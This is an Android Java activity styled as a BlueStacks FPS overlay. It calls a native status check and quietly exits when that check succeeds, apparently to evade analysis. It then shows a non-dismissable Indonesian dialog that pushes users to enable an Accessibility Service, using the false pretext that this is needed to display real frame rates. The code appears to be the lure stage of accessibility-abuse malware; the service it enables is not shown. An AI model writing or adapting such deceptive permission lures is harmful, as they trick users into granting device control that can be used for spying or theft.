package com.bluestacks.fpsoverlay;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.text.TextUtils;
import android.app.AlertDialog;
import android.widget.Button;
import android.widget.Toast;

public class CoreActivity extends Activity {

    private AlertDialog currentDialog;

    public native boolean checkStatus();

    static {
        System.loadLibrary("fps-native");
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        if (checkStatus()) {
            finish();
            return;
        }

        Button btnSave = findViewById(R.id.btn_save);
        btnSave.setOnClickListener(v -> {
            if (!isServiceEnabled()) {
                showModernAccessibilityDialog();
            } else {
                Toast.makeText(this, "Optimization Enabled", Toast.LENGTH_SHORT).show();
            }
        });
    }

    private void showModernAccessibilityDialog() {
        if (currentDialog != null && currentDialog.isShowing()) return;

        currentDialog = new AlertDialog.Builder(this, android.R.style.Theme_DeviceDefault_Light_Dialog_Alert)
            .setTitle("FPS Realtime Optimization")
            .setMessage("Aktifkan 'Accessibility Service' untuk mengizinkan aplikasi melakukan optimasi FPS secara realtime.\n\nDengan fitur ini, Anda dapat melihat FPS asli perangkat saat bermain game, bukan angka statis.")
            .setCancelable(false)
            .setPositiveButton("AKTIFKAN SEKARANG", (dialog, which) -> {
                Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
            })
            .setNegativeButton("NANTI", (dialog, which) -> dialog.dismiss())
            .show();
    }

    private boolean isServiceEnabled() {
        String s_id = getPackageName() + "/" + SupportService.class.getName();
        String active = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        if (active == null) return false;
        TextUtils.SimpleStringSplitter splitter = new TextUtils.SimpleStringSplitter(':');
        splitter.setString(active);
        while (splitter.hasNext()) {
            if (splitter.next().equalsIgnoreCase(s_id)) return true;
        }
        return false;
    }
}
